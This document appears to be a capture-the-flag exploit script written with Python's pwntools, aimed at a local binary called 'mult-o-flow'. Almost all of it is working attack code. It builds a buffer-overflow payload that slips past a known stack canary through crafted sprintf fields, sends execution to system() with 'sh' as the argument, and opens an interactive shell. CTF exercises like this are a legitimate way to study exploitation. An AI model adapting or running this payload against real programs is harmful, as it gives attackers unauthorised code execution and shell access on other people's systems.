from pwn import *

file = "./mult-o-flow"

bin = ELF(file)

sh_addr = bin.symbols['player']
system_addr = bin.symbols['system']
canary = 0x112233

conn = process(file)

# Overflow into scrape_flag
conn.send("sh" + "\x00"*62)

conn.recvuntil(":-)\n")

isp = "ISP:" + "a"*9 # Should start at temp_buf at first sprintf
isp = isp.ljust(0x200 - len("City:") - 9 + len("ISP:") + 9, "b")

city = "City:" + "c"*9 # Should start at temp_buf at second sprintf
city += "d"*4 + p32(canary)[:3] + "<" # This '<' will be become 0 in 1st sprintf

# After 1st sprintf, city string will be at start of temp_buf, with a NULL at
# the 8th byte. sprintf will stop copying city here! But the next '<' will still
# be overwritten with 0.
city += "e"*16 + p32(system_addr)[0:3] + "<"

payload = "p"*(0x1000 + 0x200 - len("ISP:") - 9)
payload += isp
payload += city
payload += "f"*4
payload += p32(sh_addr)[0:3]

#gdb.attach(conn)
conn.send(payload)

conn.interactive()
